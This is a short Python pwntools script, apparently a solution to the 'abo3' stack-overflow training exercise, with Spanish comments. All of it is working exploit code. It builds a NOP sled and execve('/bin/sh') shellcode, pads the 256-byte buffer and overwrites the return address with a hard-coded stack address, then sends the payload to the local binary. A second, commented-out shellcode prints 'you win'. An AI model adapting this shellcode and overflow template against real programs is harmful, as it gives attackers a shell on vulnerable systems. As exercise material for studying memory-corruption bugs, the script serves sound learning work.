#!/usr/bin/python

from pwn import *
import os
import sys
from struct import pack
 

context(arch='i386', os='linux')

binary = './abo3'
elf = ELF(binary)

  
#shellcode, imprime you win
#shellcode  = "\xeb\x16\x31\xc0\x59\x88\x41\x08\xb0\x04\x31\xdb\x43"
#shellcode += "\x31\xd2\xb2\x09\xcd\x80\xb0\x01\x4b\xcd\x80\xe8\xe5"
#shellcode += "\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21\x41"

shellcode  = "\xeb\x1e\x31\xc0\x5b\x88\x43\x07\x89\x5b\x08\x89\x43\x0c"
shellcode += "\x8d\x4b\x08\x8d\x53\x0c\x31\xd2\xb0\x0b\xcd\x80\xb0\x01"
shellcode += "\x31\xdb\xcd\x80\xe8\xdd\xff\xff\xff\x2f\x62\x69\x6e\x2f"
shellcode += "\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43"


ret_addr = 0xffffc9f0                                  #???? addr de buf
len_buf  = 256
   
exploit  = "\x90" * 80                                  #nops al principio de buf
exploit += shellcode                                    #shellcode
exploit += "\x42" * (len_buf-80-len(shellcode))         #completa buf
exploit += pack("<I", ret_addr)


#payload = "A"*256+"BBBB"

proc2 = process(binary)
info("send payload?")
pause()
proc2.sendline(exploit)
#proc2.recvline()
proc2.wait()
proc2.close()


